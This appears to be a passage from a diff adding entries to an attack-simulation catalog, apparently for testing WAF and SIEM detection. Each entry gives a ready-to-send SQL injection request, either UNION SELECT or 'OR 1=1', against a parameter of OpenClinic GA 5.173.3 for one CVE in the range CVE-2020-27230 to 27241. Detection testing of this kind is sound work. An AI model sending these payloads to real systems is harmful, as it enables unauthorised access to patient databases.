+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the serialnumber parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the serialnumber query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"serialnumber\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27241 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?serialnumber=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27241"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27241",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27241",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27240 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27240 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the componentStatus parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the componentStatus query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"componentStatus\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27240 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?componentStatus=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27240"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27240",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27240",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27239 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27239 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the assetStatus parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the assetStatus query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"assetStatus\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27239 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?assetStatus=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27239"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27239",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27239",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27238 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27238 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the code parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the code query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"code\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27238 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?code=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27238"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27238",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27238",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27237 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27237 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the nomenclature parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the nomenclature query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"nomenclature\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27237 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?nomenclature=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27237"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27237",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27237",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27236 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27236 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the compnomenclature parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the compnomenclature query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"compnomenclature\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27236 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?compnomenclature=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27236"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27236",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27236",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27235 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27235 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the description parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the description query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"description\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27235 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?description=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27235"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27235",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27235",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27234 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27234 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the serviceUID parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the serviceUID query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"serviceUID\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27234 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?serviceUID=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27234"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27234",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27234",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27233 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27233 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to SQL injection in the supplierUID parameter of the getAssets.jsp page (/openclinic/assets/ajax/asset/getAssets.jsp). The request sends a UNION SELECT SQL injection payload in the supplierUID query-string parameter. Confirmed path and parameter from the OpenClinic GA source (getAssets.jsp calls request.getParameter(\"supplierUID\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp (source confirming path + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27233 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /openclinic/assets/ajax/asset/getAssets.jsp?supplierUID=-1%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2020-27233"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27233",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1207"
+      },
+      {
+        "title": "source_code for CVE-2020-27233",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/assets/ajax/asset/getAssets.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27231 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27231 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to authenticated SQL injection in the findDistrict parameter of the patientslist.do page. The request is a POST to /openclinic/patientslist.do with a boolean SQL injection payload in the findDistrict form field. Confirmed path, method (POST) and parameter from the OpenClinic GA source (searchPatient.jsp: form action /patientslist.do method=post, request.getParameter(\"findDistrict\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1205 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/_common/searchPatient.jsp (source confirming path + method + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27231 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /openclinic/patientslist.do?ts=1 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=dummy\n\nfindSearchButtonClick=1&findDistrict=%27+OR+1%3D1--+-&findSector="
+    },
+    "cves": [
+      "CVE-2020-27231"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27231",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1205"
+      },
+      {
+        "title": "source_code for CVE-2020-27231",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/_common/searchPatient.jsp"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2020-27230 - OpenClinic GA SQL Injection",
+    "displayName": "CVE-2020-27230 - OpenClinic GA SQL Injection",
+    "description": "OpenClinic GA 5.173.3 is vulnerable to authenticated SQL injection in the findSector parameter of the patientslist.do page. The request is a POST to /openclinic/patientslist.do with a boolean SQL injection payload in the findSector form field. Confirmed path, method (POST) and parameter from the OpenClinic GA source (searchPatient.jsp: form action /patientslist.do method=post, request.getParameter(\"findSector\")). No vendor WAF rule found; built from the Talos advisory and source.\n\nReferences used to recreate this request:\n- https://talosintelligence.com/vulnerability_reports/TALOS-2020-1205 (Talos advisory)\n- https://github.com/freemed/openclinicga/blob/master/web/_common/searchPatient.jsp (source confirming path + method + parameter)\n- https://www.cve.org/CVERecord?id=CVE-2020-27230 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /openclinic/patientslist.do?ts=1 HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: JSESSIONID=dummy\n\nfindSearchButtonClick=1&findSector=%27+OR+1%3D1--+-&findDistrict="
+    },
+    "cves": [
+      "CVE-2020-27230"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_talos for CVE-2020-27230",
+        "link": "https://talosintelligence.com/vulnerability_reports/TALOS-2020-1205"
+      },
+      {
+        "title": "source_code for CVE-2020-27230",
+        "link": "https://github.com/freemed/openclinicga/blob/master/web/_common/searchPatient.jsp"
       }
     ],
     "public": false,
